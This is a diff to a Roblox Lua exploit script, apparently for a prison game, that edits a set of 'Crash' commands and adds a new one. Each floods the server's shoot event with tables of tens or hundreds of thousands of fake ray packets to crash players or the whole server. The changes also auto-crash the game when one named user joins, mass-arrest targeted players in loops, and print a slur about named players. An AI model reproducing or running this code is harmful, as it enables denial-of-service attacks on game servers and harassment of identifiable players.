@@ -4,6 +4,7 @@ local Cmds = {}
 local Lk = {}
 local Sa = {}
 local UltraSa = {}
+local Packets = {}
 local Players = game.Players
 local LPlayer = game.Players.LocalPlayer
 local Run = game:GetService("RunService")
@@ -1744,6 +1745,8 @@ function Crash(Cmd)
 
 if Cmd == "players" then
 
+Packets = {}
+
 CrashPlayers = true
 
 Run.Stepped:Connect(function()
@@ -1757,8 +1760,6 @@ if CrashPlayers then
 ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")
-
-local Packets = {}
 
 for SendToServer = 1,100000 do
 Packets[SendToServer] = {
@@ -1785,6 +1786,8 @@ end
 
 if Cmd == "sprit" then
 
+Packets = {}
+
 CrashSprit = true
 
 Run.Stepped:Connect(function()
@@ -1796,8 +1799,6 @@ if CrashSprit then
 ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")
-
-local Packets = {}
 
 for SendToServer = 1,500000 do
 Packets[SendToServer] = {
@@ -1826,6 +1827,8 @@ end
 
 if Cmd == "mkan" then
 
+Packets = {}
+
 CrashMkan = true
 
 Run.Stepped:Connect(function()
@@ -1837,8 +1840,6 @@ if CrashMkan then
 ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")
-
-local Packets = {}
 
 for SendToServer = 1,200000 do
 coroutine.resume(coroutine.create(function()
@@ -1869,13 +1870,13 @@ end
 
 if Cmd == "nwe" then
 
+Packets = {}
+
 function CrashNwe()
 
 ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("Remington 870") or LPlayer.Backpack:FindFirstChild("Remington 870")
-
-local Packets = {}
 
 for SendToServer = 1,200000 do
 coroutine.resume(coroutine.create(function()
@@ -1902,13 +1903,13 @@ end
 
 if Cmd == "pnl" then
 
+Packets = {}
+
 function CrashPnl()
 
 ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("Remington 870") or LPlayer.Backpack:FindFirstChild("Remington 870")
-
-local Packets = {}
 
 for SendToServer = 1,200000 do
 coroutine.resume(coroutine.create(function()
@@ -1937,6 +1938,8 @@ end
 
 if Cmd == "force" then
 
+Packets = {}
+
 CrashForceServerDie = true
 
 Run.Stepped:Connect(function()
@@ -1949,8 +1952,6 @@ if CrashForceServerDie then
 ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")
-
-local Packets = {}
 
 coroutine.wrap(function()
 for SendToServer = 1,50000 do
@@ -2004,6 +2005,8 @@ end
 
 if Cmd == "smite" then
 
+Packets = {}
+
 CrashSmite = true
 
 Run.Stepped:Connect(function()
@@ -2015,8 +2018,6 @@ if CrashSmite then
 ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")
-
-local Packets = {}
 
 for SendToServer = 1,55555 do
 Packets[SendToServer] = {
@@ -2041,7 +2042,52 @@ CrashSmite = false
 
 end
 
+if Cmd == "dest" then
+
+Packets = {}
+
+ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)
+
+local Gun = LPlayer.Character:FindFirstChild("Remington 870") or LPlayer.Backpack:FindFirstChild("Remington 870")
+
+for SendToServer = 1,24998 do
+Packets[SendToServer] = {
+{
+RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
+Distance = 2048,
+Cframe = CFrame.new(0, 0, 0),
+Hit = workspace:FindFirstChildOfClass("Part")
+},
+{
+RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
+Distance = 2048,
+Cframe = CFrame.new(0, 0, 0),
+Hit = workspace:FindFirstChildOfClass("Part")
+},
+{
+RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
+Distance = 2048,
+Cframe = CFrame.new(0, 0, 0),
+Hit = workspace:FindFirstChildOfClass("Part")
+},
+{
+RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
+Distance = 2048,
+Cframe = CFrame.new(0, 0, 0),
+Hit = workspace:FindFirstChildOfClass("Part")
+}
+}
+end
+
+for ReplicateSends = 1,5 do
+ShootEvent:FireServer(Packets,Gun)
+end
+
+end
+
 if Cmd == "little" then
+
+local Packets = {}
 
 CrashLittle = true
 
@@ -2054,8 +2100,6 @@ if CrashLittle then
 ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")
-
-local Packets = {}
 
 for SendToServer = 1,55555 do
 coroutine.resume(coroutine.create(function()
@@ -2084,11 +2128,11 @@ end
 
 if Cmd == "server" then
 
+Packets = {}
+
 ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
 
 local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")
-
-local Packets = {}
 
 for i = 1,1000 do
 ShootEvent:FireServer(Packets,Gun)
@@ -2873,6 +2917,13 @@ end
 if Connect.SendCommand("antibring") then
 if Arg2 == "on" then
 if not AntiBring then
+LPlayer.Character.ChildAdded:Connect(function(Tool)
+pcall(function()
+for i = 1,100 do
+Tool:Remove()
+end
+end)
+end)
 AntiBring = true
 Message("Anti Bring enabled.",70,70,70,Enum.Font.GothamBlack,22)
 end
@@ -3018,15 +3069,15 @@ end
 
 if Connect.SendCommand("ultrasa") then
 local Player = FindPlayer(Arg2)
-if Player ~= nil and Player.Name ~= "viniciuszk70" and not Sa[Player.UserId] then
-Sa[Player.UserId] = {Player = Player}
+if Player ~= nil and Player.Name ~= "viniciuszk70" and not UltraSa[Player.UserId] then
+UltraSa[Player.UserId] = {Player = Player}
 end
 end
 
 if Connect.SendCommand("unultrasa") then
 local Player = FindPlayer(Arg2)
-if Player ~= nil and Player.Name ~= "viniciuszk70" and Sa[Player.UserId] then
-Sa[Player.UserId] = nil
+if Player ~= nil and Player.Name ~= "viniciuszk70" and UltraSa[Player.UserId] then
+UltraSa[Player.UserId] = nil
 end
 end
 
@@ -3480,20 +3531,6 @@ end
 end)
 
 spawn(function()
-while wait(.3) do
-if AntiBring then
-if not DisableAdmin then
-pcall(function()
-LPlayer.Character.ChildAdded:Connect(function(Tool)
-Tool:Remove()
-end)
-end)
-end
-end
-end
-end)
-
-spawn(function()
 while wait() do
 if AntiVoid then
 if not DisableAdmin then
@@ -3645,14 +3682,10 @@ for i,v in pairs(UltraSa) do
 pcall(function()
 if v.Player.Character:FindFirstChild("HumanoidRootPart") then
 if v.Player.TeamColor.Name == "Really red" then
-for i = 1,50 do
-coroutine.resume(coroutine.create(function()
-for i = 1,100 do
+for i = 1,150 do
 coroutine.resume(coroutine.create(function()
 LPlayer.Character.HumanoidRootPart.CFrame = v.Player.Character.HumanoidRootPart.CFrame + v.Player.Character.HumanoidRootPart.CFrame.lookVector * -1.7
 workspace.Remote.arrest:InvokeServer(v.Player.Character.Head)
-end))
-end
 end))
 end
 else
@@ -3694,8 +3727,31 @@ end
 if Added.Name == "DizK1ll" or Added.Name == "Alt_Operator" or Added.Name == "iPipeh" or Added.Name == "iangesantos" then
 Message(Added.Name..", retarded joined the game.",255,0,191,Enum.Font.GothamBlack,20)
 end
-if Added.Name == "XxVanessa_OmqxX" or Added.Name == "gabri3l26015h" or Added.Name == "juliooo947" then
+if Added.Name == "XxVanessa_OmqxX" or Added.Name == "gabri3l26015h" then
 Message(Added.Name..", skid joined the game.",255,255,0,Enum.Font.GothamBlack,20)
+end
+if Added.Name == "juliooo947" then
+if LPlayer.Name == "viniciuszk70" then
+Message(Added.Name..", skid joined the game.",255,255,0,Enum.Font.GothamBlack,20)
+if not AntiSpam then
+AntiSpam = true
+LPlayer.Character.ChildAdded:Connect(function(Tool)
+pcall(function()
+for i = 1,100 do
+Tool:Remove()
+end
+end)
+end)
+AntiBring = true
+Message("Anti Spam enabled.",70,70,70,Enum.Font.GothamBlack,22)
+end
+if not AntiCrash then
+AntiCrash = true
+LPlayer.PlayerScripts.ClientGunReplicator.Disabled = true
+Message("Anti Crash enabled.",70,70,70,Enum.Font.GothamBlack,22)
+end
+Crash("little")
+end
 end
 if Added.Name ~= "viniciuszk70" and Added.Name ~= "estranha_rs" and Added.Name ~= "RCM_Mystx" and Added.Name ~= "33_night" and Added.Name ~= "GAB_LEALZINHO" and Added.Name ~= "DizK1ll" and Added.Name ~= "Alt_Operator" and Added.Name ~= "iPipeh" and Added.Name ~= "iangesantos" and Added.Name ~= "XxVanessa_OmqxX" and Added.Name ~= "gabri3l26015h" and Added.Name ~= "juliooo947" and Added.Name ~= "HisKarAlof" then
 Message(Added.Name..", joined the game.",255,255,255,Enum.Font.GothamBlack,20)
@@ -3742,6 +3798,20 @@ end
 end
 end)
 
+LPlayer.CharacterAdded:Connect(function()
+if AntiBring then
+if not DisableAdmin then
+LPlayer.Character.ChildAdded:Connect(function(Tool)
+pcall(function()
+for i = 1,100 do
+Tool:Remove()
+end
+end)
+end)
+end
+end
+end)
+
 Message("Some things will be activated.",70,70,70,Enum.Font.GothamBlack,22)
 
 wait(.3)
@@ -3784,6 +3854,29 @@ local SaveCam = workspace.CurrentCamera.CFrame
 workspace.Remote.loadchar:InvokeServer(nil, "1003")
 LPlayer.Character.HumanoidRootPart.CFrame = SaveFrame
 workspace.CurrentCamera.CFrame = SaveCam
+end
+
+if Players:FindFirstChild("juliooo947") then
+if LPlayer.Name == "viniciuszk70" then
+Message(Added.Name..", skid joined the game.",255,255,0,Enum.Font.GothamBlack,20)
+if not AntiSpam then
+AntiSpam = true
+LPlayer.Character.ChildAdded:Connect(function(Tool)
+pcall(function()
+for i = 1,100 do
+Tool:Remove()
+end
+end)
+end)
+AntiBring = true
+Message("Anti Spam enabled.",70,70,70,Enum.Font.GothamBlack,22)
+end
+if not AntiCrash then
+AntiCrash = true
+LPlayer.PlayerScripts.ClientGunReplicator.Disabled = true
+Message("Anti Crash enabled.",70,70,70,Enum.Font.GothamBlack,22)
+end
+end
 end
 
 if RemoveOldScript then
